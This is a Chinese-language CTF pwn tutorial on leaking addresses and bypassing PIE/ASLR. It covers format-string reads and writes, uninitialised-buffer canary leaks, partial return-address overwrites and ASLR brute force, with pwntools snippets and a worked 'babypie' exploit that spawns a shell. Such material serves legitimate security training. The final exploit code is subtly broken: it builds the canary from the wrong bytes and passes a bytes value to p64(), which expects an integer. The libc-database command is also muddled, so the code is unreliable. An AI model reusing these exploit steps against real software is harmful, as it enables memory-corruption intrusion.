# 地址泄露与 PIE/ASLR 绕过

关键词：地址泄露 泄露 leak PIE ASLR 基址 partial overwrite 部分覆盖 页对齐 低12位 puts printf 格式化字符串 format string %p environ __libc_start_main 栈残留 未初始化 canary 爆破 brute force GOT pwn

## ① 识别指纹

- `checksec` 显示 **PIE enabled**，常见组合是 PIE + Canary + NX，RELRO 为 Partial 或 Full
- 程序启动后主动打印一个十六进制地址：`printf("%p\n", buf)`、`Welcome, %p`、把缓冲区地址当提示输出
- 有可控格式化字符串：源码是 `printf(buf)`、`sprintf(buf, fmt)`，而不是 `printf("%s", buf)`
- 输出里出现明显的地址形态：`0x55...` / `0x56...`（PIE 映射区）、`0x7f...`（libc）、`0x7ff...`（栈）
- 程序用 `puts` / `printf("%s")` 打印一个由 `read` 填充、从未清零的缓冲区，输出尾部带乱码
- 没有任何地址输出，但溢出长度只够覆盖返回地址的低 1–2 字节
- 题目名带 `pie` / `babypie` / `leak` / `partial` / `format`
- 附件给了 `libc.so.6`，或者题目明确要求先泄露再返回

## ② 考什么

- PIE 基址按页对齐：运行时地址的低 12 位等于符号偏移的低 12 位
- ASLR 随机化 PIE、libc、栈、堆；`/proc/sys/kernel/randomize_va_space` 控制开关
- 直接泄露：`puts` / `printf` / `write` 打印函数指针、GOT 内容、栈指针
- 格式化字符串：`%p` 批量读栈、`%k$p` 定位参数、`%s` 解引用、`fmtstr_payload` 任意写
- 栈残留：`read` 不补 NUL，`puts` 一直打印到下一个 `\x00`；未初始化局部变量带出旧数据
- `__libc_start_main` 的返回地址泄露 libc（常见特征是 `+243` 一类固定偏移）
- `environ` 泄露栈地址，再用固定偏移定位返回地址 / canary
- partial overwrite：低 1 字节确定；低 2 字节含 4 位随机基址，需要爆破
- 爆破：fork server 的子进程继承父进程地址；32 位 ASLR 熵低
- GOT / PLT、Full RELRO 下 GOT 只读、`__free_hook` / `__malloc_hook` 在旧 libc 中可写
- `elf.address` 重定位、libc-database、one_gadget

## ③ 判断流程

### ③-1 子类型分流

1. **先 `checksec` 记录 PIE / RELRO / Canary** → PIE enabled 时后面要算代码基址；PIE disabled 时只算 libc / 栈地址 → 跳到第 2 条
2. **程序是否主动打印地址** → 有 `%p`、打印缓冲区地址、打印函数地址 → **直接泄露**，转 ③-2 A 组第 1 条；没有 → 跳到第 3 条
3. **是否存在可控格式化字符串** → `printf(buf)`、`sprintf(buf, fmt)` 且 fmt 来自输入 → **格式化字符串**，转 B 组第 1 条；只有 `printf("%s", buf)` → 跳到第 4 条
4. **是否打印未初始化 / 未终止的缓冲区** → `puts(buf)` / `printf("%s", buf)`，buf 由 `read` 填充且没有 `memset` → **残留数据泄露**，转 C 组第 1 条；没有 → 跳到第 5 条
5. **是否只有 1–2 字节写原语** → 溢出刚好到返回地址低字节，或堆上只能改 `fd` 低字节 → **partial overwrite**，转 D 组第 1 条；能完整覆盖返回地址 → 转 [ROP 与 ret2libc](/pwn/rop-ret2libc)
6. **是否 32 位 + fork 服务** → `file` 显示 i386，连续连接时目标地址只在小范围变化 → **爆破 ASLR**，转 E 组第 1 条；64 位 → 跳到第 7 条
7. **以上都不成立** → 回第 1 条，换一个输入点；仍无 → 转 [ROP 与 ret2libc](/pwn/rop-ret2libc) 的无泄露路线

### ③-2 成本排序链

**A. 直接泄露**

1. **判断泄露值属于哪个映射** → 在 gdb 里 `vmmap` 对照：落在 PIE 区间，跳到第 2 条；落在 libc 区间，跳到第 3 条；落在栈区间，跳到第 4 条
2. **PIE 函数地址** → PIE enabled：`base = leak - elf.symbols['func']`，检查 `base & 0xfff == 0`；成立就 `elf.address = base`，跳到第 5 条；PIE disabled：泄露值应等于 `elf.symbols['func']`，直接跳到第 5 条；两者都对不上，回到第 1 条确认泄露的是哪个符号
3. **libc 地址** → `libc_base = leak - libc.symbols['puts']`，检查 `libc_base & 0xfff == 0`；成立，跳到第 5 条；不成立，换一个已知函数偏移重算，仍不对就换 libc 版本
4. **栈地址** → 用 `environ` 或当前栈泄露定位返回地址 / canary 的偏移；只用于栈布局，不参与代码基址计算 → 进入第 5 条
5. **用基址收尾** → 设好 `elf.address` / `libc.address`，构造 ret2libc 或 partial overwrite 的 payload → 结束
6. **泄露被截断** → `recv(6)` 少收字节、`puts` 遇 `\x00` 提前停止 → 改用 `recvuntil(b'\n')` + `ljust(8, b'\x00')`，或把泄露函数换成 `write`，回到第 1 条
7. **以上都不成立** → 回第 1 条，换一个泄露点或换输入；仍无 → 回 ③-1 第 2 条重新找输出

**B. 格式化字符串**

1. **找参数偏移** → 发送 `b'AAAAAAAA' + b'.%p' * 20`，数到 `0x4141414141414141` 是第几个 `%p`，记为 `k`；找不到就把重复次数加到 40，回到第 1 条
2. **批量读栈** → 用 `%k$p` 逐个读，按映射区间分类：PIE 返回地址、libc 地址、栈地址、canary → 进入第 3 条
3. **算基址** → PIE 地址减 `elf.symbols` 中对应函数偏移；libc 地址减 libc 偏移；两个结果都做 `& 0xfff == 0` 自检 → 进入第 4 条
4. **任意读** → 栈上已有指向目标（GOT / 返回地址）的指针时，用 `%k$s` 读；没有就把目标地址先写进输入缓冲区，再用对应位置的 `%k$s` → 进入第 5 条
5. **任意写** → `fmtstr_payload(k, {addr: value})`，或 `%hhn` 逐字节写；目标是 GOT（Partial RELRO）、栈返回地址、旧 libc 的 `__free_hook` → 结束
6. **写不进去** → Full RELRO 的 GOT 只读、`%n` 被过滤、目标地址含 `\x00` 导致输入截断 → 改栈返回地址或 `__malloc_hook`（存在时），否则只用 `%p` 泄露，转 A 组
7. **以上都不成立** → 回第 1 条，确认格式化字符串真的可控（不是 `printf("%s", buf)`）；仍无 → 回 ③-1 第 3 条

**C. 残留数据泄露**

1. **确认缓冲区未清零** → 反编译里 `read` 前没有 `memset`，`puts` / `printf("%s")` 直接打印该缓冲区 → 进入第 2 条；有清零，回到 ③-1 第 4 条
2. **让打印越过缓冲区** → 发送正好等于缓冲区大小的字节，最后 1 字节不是 `\x00`；打印提前停止就再多发几个非零字节，回到第 2 条
3. **识别泄露内容** → 输出尾部出现 `0x7f...`（libc）、`0x55...`（PIE）、以 `\x00` 结尾的 8 字节（canary）→ 进入第 4 条
4. **分别处理** → canary 泄露：记下 8 字节，转 [栈保护绕过](/pwn/stack-protection) 做带 canary 的溢出；libc / PIE 泄露：按 A 组第 2–5 条算基址 → 进入第 5 条
5. **构造第二次 payload** → 带 canary 的栈溢出，或 ret2libc 第二段 → 结束
6. **本地有泄露、远程没有** → 远程环境变量 / 栈布局不同，偏移变化 → 用远程实际输出重新定位，回到第 1 条；仍无 → 转 B / D 组
7. **以上都不成立** → 回第 1 条，换输入长度或换打印函数；仍无 → 转 B 组看格式化字符串，或转 D 组看 partial overwrite

**D. partial overwrite**

1. **记录原返回地址的低位** → gdb 在崩溃点执行 `p/x $rip`、`x/i $rip`，记下低 12 位 → 进入第 2 条
2. **找同区域的目标** → 后门函数 / 相邻函数 / `one_gadget`：目标与原地址的 bit8–15 相同，跳到第 3 条；bit16 以上相同但 bit8–15 不同，跳到第 4 条；跨 64KB 区，跳到第 5 条
3. **低 1 字节覆盖** → 只改最低字节，保留 bit8–15；`payload = 填充 + canary + rbp + b'\x3e'` → 命中，跳到第 6 条；没命中，回到第 1 条核对原返回地址
4. **低 2 字节覆盖** → 目标与原地址在同一 64KB 区，低 16 位里的 bit12–15 来自 PIE 基址 → 循环 16 次爆破，命中跳到第 6 条；16 次都不中，回到第 1 条确认目标偏移
5. **跨页目标** → 需要覆盖 3 字节以上，高位随机不可控 → 改走 A / B / C 的泄露路线；没有泄露点，转 E 组第 1 条
6. **收尾** → 覆盖到目标后直接执行后门 / one_gadget / 栈迁移 → 结束
7. **堆上的 partial overwrite** → 只改 `fd` 低字节，让 tcache / fastbin 指向同页 fake chunk → 转 [堆利用](/pwn/heap)
8. **以上都不成立** → 回第 1 条，确认写原语真的只覆盖到目标低位

**E. 爆破 ASLR**

1. **确认 fork server** → 连续连接，每次输入后新开子进程且目标地址不变（同一父进程 fork）→ 进入第 2 条；父进程重新 exec，地址每次都变 → 回 ③-1 第 6 条
2. **确认熵足够低** → `file` 显示 32 位，连续连接记录目标地址只变低 8–12 位 → 进入第 3 条；64 位或地址高位置也变化，回到 ③-1 第 6 条
3. **写循环** → 每次连接发同一 payload，命中就 `interactive()`，失败自动重连；循环上限设成 `2^12` 量级 → 命中，进入第 4 条；循环跑完仍未命中，回 ③-1 第 6 条
4. **收尾** → 拿到 shell 后 `cat flag` → 结束
5. **以上都不成立** → 回 ③-1 第 2 条，改走泄露或 partial overwrite

## ④ 工具与命令

```bash
checksec --file=./pwn
readelf -h ./pwn | grep Type            # DYN = PIE
readelf -l ./pwn | grep LOAD            # 确认装载对齐
readelf -s ./pwn | grep -E ' (main|vul|win|backdoor)$'
objdump -d ./pwn | grep -E '<(main|vul|win|backdoor)>'
```

```bash
# gdb / pwndbg
gdb ./pwn
pwndbg> vmmap                 # 看 PIE / libc / stack 区间
pwndbg> piebase               # PIE 基址
pwndbg> telescope $rsp 30
pwndbg> x/20gx $rsp
```

```python
from pwn import *

# 找格式化字符串的参数偏移
for i in range(1, 31):
    p = process('./pwn')
    p.sendline(b'AAAAAAAA' + f'.%{i}$p'.encode())
    print(i, p.recvline())
    p.close()
```

```python
# 已知偏移后的任意写
from pwn import *
offset = 10                       # 用 %p 测出来的参数序号
payload = fmtstr_payload(offset, {elf.got['free']: elf.plt['system']})
```

```bash
one_gadget ./libc.so.6
# libc-database 反查版本（低 12 位必须匹配）
./find puts <puts偏移的低12位> <puts偏移的后3位>
```

```bash
# 本地关 ASLR 只用于调试，不能当作远程结论
setarch $(uname -m) -R ./pwn
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 算出的 PIE base 不是页对齐 | 泄露的是栈地址 / libc 地址，或减错了符号偏移 | 先 `vmmap` 确认映射，再选对应符号 |
| 低 2 字节覆盖总是打不中 | 低 16 位里的 bit12–15 来自 PIE 基址，随机 | 循环 16 次爆破；能只改 1 字节就只改 1 字节 |
| 本地能通，远程不通 | 本地关了 ASLR 或 libc 版本不同 | 远程优先，用题目 libc 和 `pwninit` 对齐 |
| 泄露值少了一两个字节 | `recv(6)` 截断，或 `puts` 遇到 `\x00` 停止 | `recvuntil` 收全后 `ljust(8, b'\x00')`，或换 `write` |
| `%p` 解析失败 | 输出有的带 `0x`、有的不带 | 统一按字符串 `int(x, 16)` 解析 |
| `%s` 直接把程序打崩 | 对应参数不是合法指针 | 先用 `%p` 确认栈上哪个位置是指针 |
| 覆盖 GOT 没反应 | Full RELRO 把 GOT 设成只读 | 改栈返回地址、`__malloc_hook`（存在时）或 FSOP |
| `elf.symbols['main']` 还是旧地址 | 设置 `elf.address` 之前取的是文件内偏移 | 先算 base 并赋值 `elf.address`，再取符号 |
| `__libc_start_main+243` 对不上 | 该偏移只对应某个 libc 版本 | 用题目 libc 重新算；不要跨版本套用 |
| partial overwrite 后程序崩在奇怪地址 | 用了 `sendline`，多出的 `\n` 改了第 3 字节 | 用 `send`，payload 只保留必要的字节 |
| 格式化字符串写坏后进程立即退出 | 写到了不可写页，或触发了栈 canary | 先泄露、后写；写之前确认目标地址可写 |
| 远程 `environ` 偏移不对 | 环境变量数量不同，栈布局变化 | 用远程泄露的栈地址反推，不要用本地偏移 |

## ⑥ 例题

**题目**：安恒杯 2018 年 7 月月赛 `babypie`（BUUCTF 复现名 `linkctf_2018.7_babypie`）
**来源**：安恒杯 2018.7；BUUCTF 有复现

**题干**：一个留言 / 回显程序，读入字符串后打印；flag 在服务器上，程序里存在一个从未被调用的后门函数。

**关键观察**：
- `checksec`：64 位，Partial RELRO，Canary found，NX enabled，**PIE enabled**
- 后门函数偏移 `0xA3E`；`vul` 的返回地址与它在同一个 256 字节块内，只有低字节不同
- `read` 填满缓冲区后不补 NUL，`printf("%s")` 会把 canary 一起打印出来
- canary 最低字节固定是 `0x00`；把它覆盖成非零，`%s` 才能继续向后打印

**走了哪条链**：③-1 第 4 条（残留数据）→ ③-2 C 组第 1–3 条（泄露 canary）→ ③-1 第 5 条（只有低位写原语）→ D 组第 1–3 条（低 1 字节覆盖到 `0xA3E`）。

**命令与输出**：

```text
$ checksec --file=./babypie
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

$ objdump -d ./babypie | grep -E '<(vul|backdoor)>'
0000000000000a3e <backdoor>:
```

canary 泄露与第二次溢出：

```python
from pwn import *

p = process('./babypie')

# 1) 0x28 填满缓冲区，再多 1 字节覆盖 canary 最低位的 \x00
p.send(b'A' * 0x28 + b'B')
data = p.recvrepeat(1)       # 回显格式以题目为准，关键是拿到 A*0x28 之后的内容
idx  = data.index(b'A' * 0x28)
# 回显里 A*0x28 之后是：覆盖后的 canary[0] + canary[1..6]
canary = b'\x00' + data[idx + 0x29:idx + 0x2f] + b'\x00'

# 2) 只改返回地址最低字节：原低字节 -> 0x3E，指向 0xA3E 的后门
payload  = b'A' * 0x28 + p64(canary) + b'B' * 8 + b'\x3e'
p.send(payload)
p.interactive()
```

```text
$ cat flag
flag{...}
```

**结果**：跳到后门函数，拿到 shell 后读取 flag。若目标与返回地址不在同一个 256 字节块内，就改成覆盖低 2 字节，并对 bit12–15 做 16 次爆破。

::: tip flag 说明
flag 随平台实例变化，以原题平台为准。这道题的关键不是背偏移，而是三步：**先把 canary 打出来 → 再确认目标与返回地址共享哪些高位 → 最后只覆盖必要的最低位**。
:::
